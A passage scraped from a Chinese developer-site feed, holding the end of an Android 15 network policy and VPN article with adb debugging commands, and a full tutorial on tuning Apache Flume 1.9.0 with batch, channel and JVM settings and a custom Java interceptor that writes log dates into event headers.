<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Android 15 - 请求企业专网切片</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestEnterpriseSlice</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
        ConnectivityManager.class);

    <span class="hljs-type">NetworkRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkRequest</span>.Builder()
        .addCapability(NET_CAPABILITY_ENTERPRISE)
        .setEnterpriseId(NET_ENTERPRISE_ID_1)  <span class="hljs-comment">// 企业切片ID</span>
        .build();

    cm.requestNetwork(request, <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkCallback</span>() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAvailable</span><span class="hljs-params">(Network network)</span> {
            <span class="hljs-comment">// 使用企业专网切片</span>
            <span class="hljs-comment">// - 低延迟 (&lt;10ms)</span>
            <span class="hljs-comment">// - 高带宽保证</span>
            <span class="hljs-comment">// - QoS优先级高</span>
            bindProcessToNetwork(network);
        }
    });
}
</code></pre>
<h3 data-id="heading-47">4.2 卫星连接支持</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Android 15 - 检测卫星网络</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSatelliteNetwork</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
        ConnectivityManager.class);

    <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">caps</span> <span class="hljs-operator">=</span> cm.getNetworkCapabilities(
        cm.getActiveNetwork());

    <span class="hljs-keyword">return</span> caps != <span class="hljs-literal">null</span> &amp;&amp;
           caps.hasTransport(TRANSPORT_SATELLITE);
}
</code></pre>
<h3 data-id="heading-48">4.3 eBPF性能提升</h3>
<p>Android 15全面使用eBPF替代iptables：</p>
<ul>
<li><strong>流量统计</strong>：O(1)复杂度</li>
<li><strong>防火墙规则</strong>：哈希查找，延迟降低90%</li>
<li><strong>CPU占用</strong>：减少60%</li>
</ul>
<hr/>
<h2 data-id="heading-49">五、总结与展望</h2>
<h3 data-id="heading-50">5.1 核心要点回顾</h3>
<ol>
<li>
<p><strong>NetworkPolicy流量控制</strong></p>
<ul>
<li>NetworkPolicyManagerService管理网络策略</li>
<li>Data Saver省流模式</li>
<li>流量统计与限制</li>
<li>eBPF性能优化</li>
</ul>
</li>
<li>
<p><strong>VPN框架</strong></p>
<ul>
<li>VpnService应用层实现</li>
<li>TUN虚拟网卡</li>
<li>路由配置与数据转发</li>
<li>Always-on VPN机制</li>
</ul>
</li>
<li>
<p><strong>网络优化</strong></p>
<ul>
<li>压缩传输</li>
<li>DNS缓存与DoH</li>
<li>连接池管理</li>
<li>流量监控工具</li>
</ul>
</li>
</ol>
<h3 data-id="heading-51">5.2 最佳实践建议</h3>





























<table><thead><tr><th align="left">场景</th><th align="left">建议</th></tr></thead><tbody><tr><td align="left">省流优化</td><td align="left">监听Data Saver状态，动态调整资源质量</td></tr><tr><td align="left">VPN开发</td><td align="left">使用TUN而非TAP，处理好异常重连</td></tr><tr><td align="left">后台同步</td><td align="left">使用WorkManager + 网络约束条件</td></tr><tr><td align="left">大文件下载</td><td align="left">分段下载，支持断点续传，WiFi优先</td></tr><tr><td align="left">实时通信</td><td align="left">使用WebSocket保持长连接，心跳保活</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-52">六、参考资源</h2>
<h3 data-id="heading-53">6.1 源码路径</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># NetworkPolicy</span>
packages/modules/Connectivity/service/src/com/android/server/net/
├── NetworkPolicyManagerService.java
├── NetworkStatsService.java
└── NetworkPolicyManagerInternal.java

<span class="hljs-comment"># VPN</span>
packages/modules/Connectivity/service/src/com/android/server/connectivity/
├── Vpn.java
└── VpnNetworkObserver.java

<span class="hljs-comment"># eBPF</span>
system/netd/bpf_progs/
├── netd.c
└── bpf_net_helpers.h
</code></pre>
<h3 data-id="heading-54">6.2 调试命令</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 网络策略</span>
adb shell dumpsys network_policy

<span class="hljs-comment"># 流量统计</span>
adb shell dumpsys netstats

<span class="hljs-comment"># VPN状态</span>
adb shell dumpsys connectivity | grep -A 20 <span class="hljs-string">"VPN"</span>

<span class="hljs-comment"># eBPF统计</span>
adb shell dumpsys connectivity trafficcontroller

<span class="hljs-comment"># 设置Data Saver</span>
adb shell cmd netpolicy <span class="hljs-built_in">set</span> restrict-background <span class="hljs-literal">true</span>

<span class="hljs-comment"># 查看UID策略</span>
adb shell cmd netpolicy list uid-policy
</code></pre>
<h3 data-id="heading-55">6.3 官方文档</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fandroid%2Fnet%2FVpnService" target="_blank" title="https://developer.android.com/reference/android/net/VpnService" ref="nofollow noopener noreferrer">VpnService Guide</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Ftraining%2Fbasics%2Fnetwork-ops%2Fdata-saver" target="_blank" title="https://developer.android.com/training/basics/network-ops/data-saver" ref="nofollow noopener noreferrer">Data Saver Best Practices</a></li>
</ul>
<hr/>
<h2 data-id="heading-56">后记</h2>
<p>网络策略和VPN是Android网络子系统中最复杂的两个模块，它们共同保障了：</p>
<ul>
<li><strong>用户隐私</strong>：VPN加密保护数据传输</li>
<li><strong>流量控制</strong>：防止后台应用偷跑流量</li>
<li><strong>电量优化</strong>：限制不必要的网络活动</li>
<li><strong>安全隔离</strong>：企业级网络访问控制</li>
</ul>
<h3 data-id="heading-57">系列文章</h3>
<ul>
<li><a href="https://juejin.cn/post/7600060691350405162" target="_blank" title="https://juejin.cn/post/7600060691350405162">上一篇：Android 15网络子系统深度解析（一）：ConnectivityService与网络管理框架全解析</a></li>
</ul>
<hr/>
<p><em>欢迎来我中的<a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">个人主页</a>找到更多有用的知识和有趣的产品</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大数据-226 离线数仓Flume 优化配置实战：batchSize/Channel/压缩/自定义拦截器与 OOM 修复]]></title>    <link>https://juejin.cn/post/7601007650722627625</link>    <guid>https://juejin.cn/post/7601007650722627625</guid>    <pubDate>2026-01-30T13:06:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601007650722627625" data-draft-id="7600964907489460230" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大数据-226 离线数仓Flume 优化配置实战：batchSize/Channel/压缩/自定义拦截器与 OOM 修复"/> <meta itemprop="keywords" content="后端,大数据,Apache Flume"/> <meta itemprop="datePublished" content="2026-01-30T13:06:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="武子康"/> <meta itemprop="url" content="https://juejin.cn/user/149189314230039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大数据-226 离线数仓Flume 优化配置实战：batchSize/Channel/压缩/自定义拦截器与 OOM 修复
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/149189314230039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    武子康
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:06:40.000Z" title="Fri Jan 30 2026 13:06:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TL;DR</h2>
<ul>
<li>场景：离线数仓采集日志写入 HDFS，Flume Agent 吞吐、稳定性与落盘分区时间准确性需要同时保证</li>
<li>结论：优先用批量参数与 Channel 容量/事务配合提升吞吐，用 JVM 堆参数解决 OOM，用拦截器把业务时间写入 header 修正分区路径</li>
<li>产出：可复用的 Flume 1.9.0 调优清单 + OOM 速修命令 + 自定义 Interceptor（logtime header）落地模板</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a3d97f77496343d09c16b141f957d25d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383200&amp;x-signature=SP7uSvZn3cNPYjDqPoruTfNc9HU%3D" alt="大数据-226 离线数仓Flume 优化配置实战：batchSize/Channel/压缩/自定义拦截器与 OOM 修复" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eaa267bad42548c9902abdbda8746372~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383200&amp;x-signature=mpsWZqpBOJzS0yK7Rv3m2X1Tgw8%3D" alt="离线数仓架构图" loading="lazy"/></p>
<h2 data-id="heading-1">Flume的优化配置</h2>
<p>Flume 是一种分布式、可靠且高效的数据收集、聚合和传输系统，广泛应用于大数据生态系统中。为了提升 Flume 的性能和稳定性，优化配置至关重要。</p>
<p>使用如下的指令，启动Agent进行测试：</p>
<pre><code class="hljs language-shell" lang="shell">flume-ng agent --conf-file /opt/wzk/flume-conf/flume-log2hdfs1.conf -name a1 -Dflum
e.roog.logger=INFO,console
</code></pre>
<p>启动后的截图如下所示：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4aae07ec211e4a13858f881ee1c5be2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383200&amp;x-signature=JOCWv0y6btJ3um%2Fq8MiOd5h2lAY%3D" alt="离线数仓Flume启动" loading="lazy"/></p>
<p>查看刚才的Flume窗口：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3dd8c226b17487d8114d3bce1656863~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383200&amp;x-signature=SGMi36RywTLV%2F0n23VLvNgjkunU%3D" alt="离线数仓Flume日志" loading="lazy"/></p>
<p>查看HDFS的内容：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c798bd4cc37540f581aaed1a0852d835~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383200&amp;x-signature=nScgFdIfyY0v8HPmczsbZ5J2TMk%3D" alt="离线数仓 HDFS 内容" loading="lazy"/></p>
<h3 data-id="heading-2">批量处理</h3>
<ul>
<li>参数：batchSize</li>
<li>作用：控制 Flume 在批量传输时每次传输的事件数量。
配置建议：</li>
<li>Source 到 Channel：根据 Source 的吞吐量和 Channel 的吞吐能力调整，推荐值为 100-1000。</li>
<li>Channel 到 Sink：根据 Sink 的处理能力和目标系统的写入性能调整，推荐值为 500-5000。</li>
</ul>
<h3 data-id="heading-3">压缩传输</h3>
<ul>
<li>参数：compressionType</li>
<li>作用：对事件进行压缩后传输，减少网络带宽消耗。</li>
<li>支持的压缩类型：gzip、snappy、lz4 等。</li>
<li>配置建议：根据目标系统是否支持解压缩功能选择合适的压缩类型。</li>
</ul>
<h3 data-id="heading-4">Source 优化</h3>
<h4 data-id="heading-5">Taildir Source</h4>
<ul>
<li>参数：batchSize 和 fileHeader</li>
<li>batchSize：设置单次从文件中读取的事件数量。</li>
<li>fileHeader：是否在事件头部添加文件名，推荐开启以便于后续处理。</li>
</ul>
<h4 data-id="heading-6">Kafka Source</h4>
<ul>
<li>参数：kafka.consumer.timeout.ms 和 fetch.message.max.bytes</li>
<li>kafka.consumer.timeout.ms：设置 Kafka 消费者读取数据的超时时间，通常为 100-500ms。</li>
<li>fetch.message.max.bytes：设置每次读取的最大消息大小，默认值通常为 1MB，可以根据业务场景适当调整。</li>
</ul>
<h3 data-id="heading-7">Channel 优化</h3>
<h4 data-id="heading-8">Memory Channel</h4>
<ul>
<li>参数：capacity 和 transactionCapacity</li>
<li>capacity：Channel 中允许的最大事件数。</li>
<li>transactionCapacity：单次事务中允许的最大事件数。</li>
</ul>
<h4 data-id="heading-9">File Channel</h4>
<ul>
<li>参数：checkpointDir 和 dataDirs</li>
<li>checkpointDir：存储 Channel 状态的目录。</li>
<li>dataDirs：存储事件数据的目录，建议设置多个磁盘路径以提升 IO 性能。</li>
<li>配置建议：确保磁盘 IO 性能足够，避免瓶颈。</li>
</ul>
<h2 data-id="heading-10">Flume报错解决</h2>
<p>向 logs 目录中存放入日志文件，此时如果出现OOM的日志，是因为缺省情况下FlumeJVM的最大分配20M，这个值太小，需要调整。
我这里直接放入：</p>
<pre><code class="hljs language-shell" lang="shell">vim /opt/wzk/logs/start/test.log

2020-07-30 14:18:47.339 [main] INFO com.ecommerce.AppStart - {"app_active":{"name":"app_active","json":{"entry":"1","action":"1","error_code":"0"},"time":1596111888529},"attr":{"area":"泰安","uid":"2F10092A9","app_v":"1.1.13","event_type":"common","device_id":"1FB872-9A1009","os_type":"4.7.3","channel":"DK","language":"chinese","brand":"iphone-9"}}

</code></pre>
<p>解决方案：
在 $FLUME_HOME/conf/flume-env.sh 中增加以下内容:</p>
<pre><code class="hljs language-shell" lang="shell">export JAVA_OPTS="-Xms4000m -Xmx4000m -
Dcom.sun.management.jmxremote"
<span class="hljs-meta prompt_"># </span><span class="bash">要想使配置文件生效，还要在命令行中指定配置文件目录</span>
flume-ng agent --conf flume-1.9/conf --conf-file flume-log2hdfs1.conf -name a1 -Dflume.root.logger=INFO,console

flume-ng agent --conf-file flume-log2hdfs1.conf -name a1 -Dflume.root.logger=INFO,console
</code></pre>
<p>Flume内存参数设置及优化：</p>
<ul>
<li>根据日志数据量大小，JVM堆一般要设置为4G或者更高</li>
<li>-Xms -Xmx最好设置一致，减少内存抖动带来的性能影响</li>
</ul>
<h2 data-id="heading-11">自定义拦截器</h2>
<p>前面FlumeAgent的配置使用了本地时间，可能导致数据存放的路径不正确。要解决上面的问题就需要使用自定义拦截器。
Agent用于测试自定义拦截器，source =&gt; logger sink
flumetest1.conf</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">a1是agent的名称。<span class="hljs-built_in">source</span>、channel、sink的名称分别为：r1 c1 k1</span>
a1.sources = r1
a1.channels = c1
a1.sinks = k1
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-built_in">source</span></span>
a1.sources.r1.type = netcat
a1.sources.r1.bind = h122.wzk.icu
a1.sources.r1.port = 9999
a1.sources.r1.interceptors = i1
a1.sources.r1.interceptors.i1.type = icu.wzk.CustomerInterceptor$Builder
<span class="hljs-meta prompt_"># </span><span class="bash">channel</span>
a1.channels.c1.type = memory
a1.channels.c1.capacity = 10000
a1.channels.c1.transactionCapacity = 100
<span class="hljs-meta prompt_"># </span><span class="bash">sink</span>
a1.sinks.k1.type = logger
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-built_in">source</span>、channel、sink之间的关系</span>
a1.sources.r1.channels = c1
a1.sinks.k1.channel = c1
</code></pre>
<h3 data-id="heading-12">自定义拦截器原理</h3>
<p>自定义拦截器的原理：</p>
<ul>
<li>自定义拦截器要集成 Flume 的 Interceptor</li>
<li>Event 分为 header 和 body （接收的字符串）</li>
<li>获取 header 和 body</li>
<li>从 body 中 获取 time，并将时间戳转换为字符串 yyyy-MM-dd</li>
<li>将转换后的字符串放置到header中</li>
</ul>
<h3 data-id="heading-13">自定义拦截器实现</h3>
<p>自定义拦截器的实现：</p>
<ul>
<li>获取event的header</li>
<li>获取event的body</li>
<li>解析body获取json串</li>
<li>解析json串获取时间戳</li>
<li>将时间戳转换为字符串 yyyy-MM-dd</li>
<li>将转换后的字符串放置header中</li>
<li>返回event</li>
</ul>
<h3 data-id="heading-14">导入依赖</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.flume<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>flume-ng-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-15">编写代码</h3>
<pre><code class="hljs language-shell" lang="shell">package icu.wzk;


import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.apache.flume.Context;
import org.apache.flume.Event;
import org.apache.flume.interceptor.Interceptor;

import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class CustomerInterceptor implements Interceptor {

    @Override
    public void initialize() {

    }

    @Override
    public Event intercept(Event event) {
        // 这里是逐条处理
        String eventBody = new String(event.getBody(), StandardCharsets.UTF_8);
        // 获取Event的Header
        Map&lt;String, String&gt; headerMap = event.getHeaders();
        // 解析Body获取JSON字符串
        String[] bodyArr = eventBody.split("\\s+");
        try {
            String jsonStr = bodyArr[6];
            // 解析JSON字符串获取时间戳
            JSONObject jsonObject = JSON.parseObject(jsonStr);
            String timestampStr = jsonObject.getJSONObject("app_active").getString("time");
            // 将时间戳转换字符串 yyyy-MM-dd
            // 将字符串转换为Long
            long timestampLong = Long.parseLong(timestampStr);
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
            Instant instant = Instant.ofEpochMilli(timestampLong);
            LocalDateTime localDateTime = LocalDateTime.ofInstant(instant, ZoneId.systemDefault());
            String date = formatter.format(localDateTime);
            // 将转换后的字符串放置header中
            headerMap.put("logtime", date);
            event.setHeaders(headerMap);
        } catch (Exception e) {
            headerMap.put("logtime", "Unknown");
            event.setHeaders(headerMap);
        }
        return event;
    }

    @Override
    public List&lt;Event&gt; intercept(List&lt;Event&gt; list) {
        List&lt;Event&gt; lstEvent = new ArrayList&lt;&gt;();
        for (Event event : list) {
            Event outEvent = intercept(event);
            if (outEvent != null) {
                lstEvent.add(outEvent);
            }
        }
        return lstEvent;
    }

    @Override
    public void close() {

    }

    public static class Builder implements Interceptor.Builder {
        @Override
        public Interceptor build() {
            return new CustomerInterceptor();
        }
        @Override
        public void configure(Context context) {
        }
    }

}

</code></pre>
<h2 data-id="heading-16">其他系列</h2>
<h3 data-id="heading-17">🚀 AI篇持续更新中（长期更新）</h3>
<p><strong>AI炼丹日志-29 - 字节跳动 DeerFlow 深度研究框<em>斜体样式</em>架 私有部署 测试上手 架构研究</strong>，持续打造实用AI工具指南！
<strong>AI研究-132 Java 生态前沿 2025：Spring、Quarkus、GraalVM、CRaC 与云原生落地</strong></p>
<h3 data-id="heading-18">💻 Java篇持续更新中（长期更新）</h3>
<p><strong>Java-218 RocketMQ Java API 实战：同步/异步 Producer 与 Pull/Push Consumer</strong>
MyBatis 已完结，Spring 已完结，Nginx已完结，Tomcat已完结，分布式服务已完结，Dubbo已完结，MySQL已完结，MongoDB已完结，Neo4j已完结，FastDFS 已完结，OSS已完结，GuavaCache已完结，EVCache已完结，RabbitMQ已完结，RocketMQ正在更新... 深入浅出助你打牢基础！</p>
<h3 data-id="heading-19">📊 大数据板块已完成多项干货更新（300篇）：</h3>
<p>包括 Hadoop、Hive、Kafka、Flink、ClickHouse、Elasticsearch 等二十余项核心组件，覆盖离线+实时数仓全栈！
<strong>大数据-278 Spark MLib - 基础介绍 机器学习算法 梯度提升树 GBDT案例 详解</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter最佳实践：Sliver族网络刷新组件NCustomScrollView]]></title>    <link>https://juejin.cn/post/7600955777315897382</link>    <guid>https://juejin.cn/post/7600955777315897382</guid>    <pubDate>2026-01-30T13:07:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777315897382" data-draft-id="7601028900885479470" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter最佳实践：Sliver族网络刷新组件NCustomScrollView"/> <meta itemprop="keywords" content="前端,Flutter"/> <meta itemprop="datePublished" content="2026-01-30T13:07:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SoaringHeart"/> <meta itemprop="url" content="https://juejin.cn/user/3544481219481374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter最佳实践：Sliver族网络刷新组件NCustomScrollView
